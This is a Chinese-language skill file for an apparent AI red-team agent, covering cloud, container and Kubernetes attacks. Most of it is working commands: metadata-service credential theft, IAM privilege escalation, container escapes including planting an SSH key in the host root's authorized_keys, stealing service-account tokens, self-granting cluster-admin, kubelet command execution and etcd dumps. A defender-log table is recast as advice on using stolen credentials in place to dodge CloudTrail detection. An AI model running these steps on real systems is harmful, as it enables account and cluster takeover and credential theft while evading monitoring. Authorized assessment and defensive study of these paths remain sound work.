---
name: cloud-k8s
description: Use for authorized cloud, container, and Kubernetes security assessment including metadata SSRF, IAM misconfig, container escape paths, and cluster RBAC review.
whenToUse: Use for authorized cloud, container, and Kubernetes security assessment including metadata
source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
---

# Cloud / Container / Kubernetes Security

## 适用场景

- 云元数据 SSRF（169.254.169.254 / IMDS）
- IAM 过度权限、公开存储桶、错误安全组
- Docker/containerd 逃逸路径评估
- Kubernetes RBAC、Secrets、Admission、供应链镜像
- 容器镜像漏洞（可联动 `supply-chain-security/`）

## 工作流

### Phase 1 — 身份与边界

```text
□ 当前身份：云 AK/SK、K8s SA、节点 SSH？
□ 范围：单账号 / 单 cluster / 单 namespace
□ 网络档：authorized_target_only
```

### Phase 2 — 云控制面

**先确认身份**——云上最贵的错误是「以为在打 A 账号，其实在打自己的账号」：

```bash
# AWS
aws sts get-caller-identity            # 账号 ID / ARN / 用户
aws configure list                     # 用的哪份凭据、哪个 region

# Azure
az account show
az ad signed-in-user show

# GCP
gcloud config list
gcloud auth list
```

**① 元数据服务（SSRF 链的中点）**

```bash
# AWS IMDSv1（无需 token，SSRF 直接读）
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
#   → 返回 AccessKeyId/SecretAccessKey/Token，这就是临时凭据

# AWS IMDSv2（需两步，SSRF 要能自定义 header 才打得动）
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP（必须带 header，纯 URL SSRF 打不动）
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**判据**：能读到 `AccessKeyId` 就等于拿到该实例的角色权限。**先 `aws sts get-caller-identity` 用这份凭据确认身份**，再决定往哪打——别拿凭据乱扫。

**② 权限提权的四条常见路**

```bash
# ① iam:PassRole + 服务创建 → 用高权角色跑自己的代码
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument]'
#  找信任策略里允许你 assume 的、且权限大的

# ② 已有角色的策略枚举（找 * 资源 + 危险动作）
aws iam list-attached-role-policies --role-name <role>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# ③ 存储桶公开 / ACL 错配
aws s3 ls                                  # 列自己账号的桶
aws s3api get-bucket-acl --bucket <b>      # 看 AllUsers 有没有 READ
aws s3api get-bucket-policy --bucket <b>

# ④ Lambda / 容器内嵌凭据（环境变量里常有）
aws lambda get-function --function-name <f> --query 'Configuration.Environment'
```

**判据**：`PassRole` + 能创建服务（Lambda/EC2/Glue）＝ 几乎必能提权；只有 `s3:GetObject` 单项权限的凭据价值有限，先去换更高权的。

### Phase 3 — 容器逃逸（从 Pod 到节点）

**先判断你有没有逃逸的条件**——不是所有容器都能逃，看清楚再动手：

```bash
# 一条命令把逃逸条件全查一遍
cat /proc/1/cgroup | head -3          # 是不是容器（含 docker/kubepods 字样）
capsh --print | grep Current         # 有哪些 capability
mount | grep -E "hostPath|/host"     # 有没有宿主机目录挂载
ls /var/run/docker.sock 2>/dev/null  # 有没有 docker socket
cat /proc/self/status | grep CapEff  # 十六进制能力位
```

| 条件 | 逃逸方式 | 一句话 |
|---|---|---|
| `privileged: true` | `cap_sys_admin` 全开 → `mount` 宿主机盘 | 最直接，`mount /dev/sda1 /mnt` 就进宿主机 |
| `SYS_ADMIN` capability | 同上（不必 privileged） | `capsh --print` 里看到 `cap_sys_admin` 即可 |
| `hostPath: /` 挂载 | 直接写宿主机文件 | 在 `/host` 或挂载点下写 cron / authorized_keys |
| `docker.sock` 挂载 | 通过 socket 起新容器挂宿主机根 | `docker -H unix:///var/run/docker.sock run -v /:/h ...` |
| `hostNetwork: true` | 只能看宿主机网络，逃不出去 | 但能直连 127.0.0.1 上的节点服务（kubelet:10250） |
| `hostPID: true` | 能杀/nsenter 宿主机进程 | `nsenter -t 1 -m -u -i -n -p -- sh` |

```bash
# privileged 逃逸（最典型）
mkdir -p /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host sh -c 'id'      # 已是宿主机 root
# 或更轻：直接写宿主机 authorized_keys
echo "ssh-rsa AAAA..." >> /tmp/host/root/.ssh/authorized_keys

# hostPID + nsenter（不需要 mount 权限）
nsenter -t 1 -m -u -i -n -p -- sh

# docker.sock 逃逸
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host sh
```

**注意**：`cgroup v2` 下 `/proc/1/cgroup` 可能不含容器字样，改看 `/proc/self/mountinfo` 里的 `overlay` 层。

### Phase 4 — Kubernetes

**第一步永远是 `auth can-i --list`**——它直接告诉你这个 SA 能干什么，不用猜：

```bash
# 我在这个 namespace 能做什么
kubectl auth can-i --list

# 整个集群（如果 RBAC 允许）
kubectl auth can-i --list --all-namespaces

# 关键判断：能不能读 secret / 能不能 create pod
kubectl auth can-i get secrets -A
kubectl auth can-i create pods
kubectl auth can-i create clusterrolebindings
```

**RBAC 提权的三条主路**：

```bash
# ① 能读 secret → 读别的 SA 的 token → 用它干活
kubectl get secrets -A
kubectl get secret <sa-token> -o jsonpath='{.data.token}' | base64 -d

# ② 能 create pod → 起一个挂高权 SA 的 pod
kubectl run pwn --image=alpine --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"<high-priv-sa>"}}' \
  -- sleep 3600
kubectl exec -it pwn -- sh

# ③ 能 create clusterrolebinding → 直接给自己 cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=default:pwn
```

**节点侧入口**（拿到 pod 后往节点走）：

```bash
# kubelet API（10250 匿名可读是经典配置错误）
curl -sk https://<node>:10250/pods | jq '.items[].metadata.name'
curl -sk https://<node>:10250/run/<ns>/<pod>/<container> -d "cmd=id"

# etcd（2379 未授权 = 整个集群的 secret）
etcdctl --endpoints=http://<node>:2379 get / --prefix --keys-only | head
```

**判据**：`10250` 匿名读得到 `/pods` → 可直接在任意 pod 里执行命令，这是「从单 pod 到整集群」的最短路径，优先级高于 RBAC 提权。

## 检测视角（防守方在日志里看到什么）

| 动作 | 防守方看哪里 | 典型信号 |
|---|---|---|
| 元数据服务读取 | CloudTrail / VPC Flow Logs | 从 EC2 内部 IP 到 `169.254.169.254` 的异常高频请求 |
| 凭据被外部使用 | CloudTrail `userIdentity` | 临时凭据在**非该实例所在 region** 或非该实例 IP 使用 |
| IAM 提权 | CloudTrail `CreateRole`/`AttachRolePolicy`/`PassRole` | 短时间内新建角色并立即被 assume |
| 公开桶 | S3 access log | 来自非账号内 IP 的 `GET`，且 `requester` 为 `-`（匿名） |
| 容器逃逸 | 节点 auditd / Falco | `mount` 系统调用 + 目标设备非常规；`nsenter` 进程出现 |
| 读 kubelet 10250 | 节点 kubelet log | 匿名请求 `/pods` 或 `/run/`；`authentication failed` 缺失 |
| 读 secret | K8s audit log | 单 SA 短时间跨 namespace `get secrets` |
| 创建高权 pod | K8s audit log | pod 的 `serviceAccountName` 与创建者权限不匹配 |

**实用推论**：云上最难藏的是**凭据跨地域/跨 IP 使用**——这是 CloudTrail 一定会记的。所以拿到临时凭据后，优先在原地（同 region、同实例出口）用，别急着本地化到攻击机。

## 工具链

| 工具 | 用途 | 自举 |
|------|------|------|
| kubectl | 集群交互 | 手动 |
| trivy | 镜像/IaC | （本机未装）`trivy` 若可用 |
| kube-bench / kubeaudit | CIS/配置 | 手动 |
| pacu / scoutsuite | 云审计（授权） | 手动 |
| nuclei | 已知云漏洞模板 | 若已装则用 nmap/nuclei 生态 |

## 参考

- `references/k8s-cloud-checklist.md`
- CTF 对照：`../../CTF-Sandbox-Orchestrator/competition-agent-cloud/`
- `../supply-chain-security/` `../pentest-tools/`

## 路由上下文

**上游**: MASTER R23  
**下游**: 拿到节点 shell → `attack-chain` / `windows-ad`；镜像漏洞 → supply-chain  
**MUST NOT**: 未授权扫公有云其他租户

## 任务完成自检

- [ ] 是否限定在授权账号/cluster？
- [ ] 发现是否含复现与影响？
- [ ] 是否避免破坏性操作？
- [ ] 报告 / journal？

## 本机工具实况（导入时快照；当前真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核——表会过期，命令不会）

| 工具 | 状态 |
| --- | --- |
| `nmap` | ✓ 已装（toolkit 内，非 PATH） |



<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **前提没满足就先回去**：`identity-federation` —— 上一环没做实，本环再试也是空打

2. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

3. **目标比预期更深**：换到同主题的专项靶子面 `competition-k8s-control-plane`、`competition-cloud-metadata-path`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`identity-federation`
- **下游**（产出交给谁）：`competition-k8s-control-plane`、`competition-cloud-metadata-path`
- **专项下游**（同主题更深的靶子面）：`competition-k8s-control-plane`、`competition-cloud-metadata-path`
- **落库**：本技能不直接产出可落库实体；产出交给下游技能记进演练台
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名


<!-- /skill-link-graph -->

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 持久化 | T1525 | 植入云实例镜像 |
| 提权 | T1611 | Escape to Host（容器逃逸到宿主） |
| 隐匿 | T1610 | Deploy Container（部署容器） |
| 凭据访问 | T1552.001 | 文件中的凭据 |
| 发现 | T1526 | 云服务发现 |
| 发现 | T1613 | 容器与资源发现 |
| 发现 | T1619 | 云存储对象发现 |
| 收集 | T1530 | 云存储数据 |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
